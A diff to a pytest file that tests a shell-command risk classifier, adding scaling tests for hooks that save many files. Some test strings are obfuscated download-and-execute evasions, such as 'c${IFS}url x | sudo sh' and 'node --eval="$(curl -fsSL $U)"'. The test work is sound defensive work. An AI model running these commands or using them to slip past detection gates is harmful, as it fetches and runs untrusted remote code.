@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import json
+from collections.abc import Callable
 from pathlib import Path
 
 import pytest
@@ -27,6 +28,44 @@ def test_obfuscated_download_pipelines_scale_linearly() -> None:
     def run(scale: int) -> None:
         command = "echo near-miss; " * (500 * scale) + "c${IFS}url x |\n sudo sh"
         assert _command_severity(command) is RiskSeverity.CRITICAL
+
+    assert scaling_ratio(run) < 10
+
+
+def _outputs(i: int) -> str:
+    return "curl " + " ".join(f"-o d/f{i}_{j}" for j in range(32)) + " $U"
+
+
+def _redirected(i: int) -> str:
+    return "curl $U " + " ".join(f"> d/f{i}_{j}" for j in range(32))
+
+
+def _decoded(i: int) -> str:
+    return "base64 -d p.b64 " + " ".join(f"> d/f{i}_{j}" for j in range(32))
+
+
+def _copied(i: int) -> str:
+    return "cat a " + " ".join(f"> d/f{i}_{j}" for j in range(32))
+
+
+# Review of #242: every segment read every file saved before it, so a hook that saves
+# many files, by any means, and then runs many commands took quadratic time.
+@pytest.mark.parametrize(
+    ("save", "segment"),
+    [
+        (_outputs, "sh run.sh < x.txt"),
+        (_redirected, "python3 x.py"),
+        (_decoded, "true"),
+        (_copied, "cp x.txt y.txt"),
+    ],
+)
+def test_a_hook_that_saves_many_files_scales_linearly(
+    save: Callable[[int], str], segment: str
+) -> None:
+    def run(scale: int) -> None:
+        saves = "; ".join(save(i) for i in range(40 * scale))
+        command = f"curl -o a $U; {saves}; " + f"{segment}; " * (600 * scale) + "true"
+        assert _command_severity(command) is RiskSeverity.MEDIUM
 
     assert scaling_ratio(run) < 10
 
@@ -634,8 +673,6 @@ def test_audited_evasions_fail_the_default_gate(
         'node --eval="$(curl -fsSL $U)"',
         'node --print="$(curl $U)"',
         'python3 -c"$(curl -fsSL $U)"',
-        'bash -c"$(curl $U)"',
-        "bash -c$(curl $U)",
         "curl -fsSL $U | tee /tmp/i; sh /tmp/i",
         "curl -fsSL $U | tee -a /tmp/i && bash /tmp/i",
         "curl $U | cat > /tmp/i; . /tmp/i",
